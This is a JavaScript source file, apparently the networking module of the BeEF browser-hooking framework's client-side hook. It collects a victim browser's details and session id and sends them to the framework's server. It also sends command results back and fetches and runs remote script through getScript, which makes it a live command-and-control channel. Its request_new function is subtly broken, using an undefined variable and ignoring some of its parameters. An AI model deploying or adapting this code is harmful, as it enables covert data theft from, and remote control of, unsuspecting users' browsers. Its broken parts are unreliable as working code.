/*!
 * @literal object: beef.net
 *
 * Provides basic networking functions.
 */
beef.net = {
	
	beef_url: "<%= @beef_url %>",
	beef_hook: "<%= @beef_hook %>",
	beef_queue: [],

	
	/**
     * Gets an object that can be used for ajax requests.
     * 
     * @example: var http = beef.net.get_ajax();
     */
    get_ajax: function() {
            
        // try objects
        try {return new XMLHttpRequest()} catch(e) {};
        try {return new ActiveXObject('Msxml2.XMLHTTP')} catch(e) {};
        try {return new ActiveXObject('Microsoft.XMLHTTP')} catch(e) {};
    
        // unsupported browser
        console.error('You browser is not supported')
        console.error('please provide details to dev team')
        return false;
    },
    
	
	/**
	 * Build param string from hash.
	 */
	construct_params_from_hash: function(param_array) {
		
		param_str = "";
		
		for (var param_name in param_array) {
			param_str = this.construct_params(param_str, param_name, param_array[param_name])
		}
		
		return param_str;
	},
	
	/**
	 * Build param string.
	 */
	construct_params: function(param_str, key, value) {
		
		// if param_str is not a str make it so
		if (typeof(param_str) != 'string') param_str = '';
		
		if (param_str != "" ) { param_str += "&"; } // if not the first param add an '&'
		param_str += key;
		param_str += "=";
		param_str += beef.encode.base64.encode(value);
		
		return param_str;
	},
	
	/**
	 * Performs http requests.
	 * @param: {String} the url to send the request to.
	 * @param: {String} the method to use: GET or POST - **NOTE** This param now ignored
	 * @param: {Function} the handler to callback once the http request has been performed.
	 * @param: {String} the parameters to send for a POST request.
	 * 
	 * @example: beef.net.raw_request("http://beef.com/", 'POST', handlerfunction, "param1=value1&param2=value2");
	 */
	raw_request: function(url, method, handler, params) {
		$j.getScript( url + '?' + params, handler);
	},
	
	/**
	 * Performs http requests with browoser id.
	 * @param: {String} the url to send the request to.
	 * @param: {String} the method to use: GET or POST - **NOTE** This param now ignored
	 * @param: {Function} the handler to callback once the http request has been performed.
	 * @param: {String} the parameters to send for a POST request.
	 * 
	 * @example: beef.net.request("http://beef.com/", 'POST', handlerfunction, "param1=value1&param2=value2");
	 */
	request: function(url, method, handler, params) {
		params += '&BEEFHOOK=' + BEEFHOOK; // append browser id
		this.raw_request(url, method, handler, params);
	},
	
	/**
	*Performs http requests
	* @param: {String} scheme: HTTP or HTTPS
	* @param: {String} method: GET or POST
	* @param: {String} domain: bindshell.net, 192.168.3.4, etc
	* @param: {Int} port: 80, 5900, etc
	* @param: {String} path: /path/to/resource
	* @param: {String} anchor: this is the value that comes after the # in the URL
	* @param: {String} data: This will be used as the query string for a GET or post data for a POST
	* @param: {Int} timeout: timeout the request after N seconds
	* @param: {Bool} dataType: specify the data return type expected (ie text/html/script) 
	* @param: {Funtion} callback: call the callback function at the completion of the method
	*
	* @return: {Object} response: this object contains the response details
	*/
	//TODO build response object and return it
	request_new: function(scheme, method, domain, port, path, anchor, data, timeout, execute, callback) {
		
		//check if same domain or cross domain
		if (document.domain == domain){
			same_domain = true
		}else{
			same_domain = false
		}
		
		//build and execute request
		$j.ajax({type: method,
			 dataType: dataType,
		     url: scheme+"://"+domain+":"+port+path+"#"+anchor,
		     data: data,
		     timeout: (timeout * 1000),
		     //function on success
		     success: function(data, textStatus, jqXHR){
		    	 console.log(data);
		     },
		     //function on failure
	    	 error: function(jqXHR, textStatus, errorThrown){
	    		 console.log(errorThrown);
		     }
		});
	},
	
	/**
	 * Send browser details back to the framework. This function will gather the details 
	 * and send them back to the framework
	 * 
	 * @example: beef.net.sendback_browser_details();
	 */
	sendback_browser_details: function() {
		// get hash of browser details
		var details = beef.browser.getDetails();
		
		// get the hook session id
		details['HookSessionID'] = beef.session.get_hook_session_id();
		
		// contruct param string
		var params = this.construct_params_from_hash(details);
		
		// return data to the framework
		this.sendback("/init", 0, params);
	},
	
	/**
	 * Queues a communication request to be sent the next time the hook updates
	 * @param: {String} The url to return the results to.
	 * @param: {Integer} The command id that launched the command module.
	 * @param: {String/Object} The results to send back.
	 * @param: {Function} the handler to callback once the http request has been performed.
	 * 
	 * @example: beef.net.queue("/commandmodule/prompt_dialog.js", 19, "answer=zombie_answer");
	 */
	queue: function(commandmodule, command_id, results, handler) {
		this.beef_queue.push({'command':commandmodule, 'cid':command_id, 'results':results, 'handler':handler});
	},
	
	/**
	 * Sends results back to the BeEF framework.
	 * @param: {String} The url to return the results to.
	 * @param: {Integer} The command id that launched the command module.
	 * @param: {String/Object} The results to send back.
	 * @param: {Function} the handler to callback once the http request has been performed.
	 * 
	 * @example: beef.net.sendback("/commandmodule/prompt_dialog.js", 19, "answer=zombie_answer");
	 */
	sendback: function(commandmodule, command_id, results, handler) {
		beef.net.queue(commandmodule, command_id, results, handler);
		beef.net.flush_queue();
	},
	
	/**
	 * Sends results back to the BeEF framework.
	 */
	flush_queue: function() {
		for (var i in this.beef_queue)
		{
			var results = this.beef_queue[i]['results'];
			if(typeof results == 'object') {
				s_results = '';
				for(key in results) {
					s_results += key + '=' + escape(results[key].toString()) + '&';
				}
				results = s_results;
			}
			
			if(typeof results == 'string' && typeof this.beef_queue[i]['cid'] == 'number') {
				results += '&command_id='+this.beef_queue[i]['cid'];
				this.request(this.beef_url + this.beef_queue[i]['command'], 'POST', this.beef_queue[i]['handler'], results);
			}
			this.beef_queue[i]['expunge'] = true;
		}
		beef.net.expunge_queue();
	},
	
	/**
	 * Cleans queue of commands that have been executed
	 */
	expunge_queue: function() {
		for (var i = 0; i < this.beef_queue.length; i++)
		{
			if (this.beef_queue[i] && this.beef_queue[i]['expunge'])
			{
				this.beef_queue.splice(i,1);
			}
		}
	}
	
};

beef.regCmp('beef.net');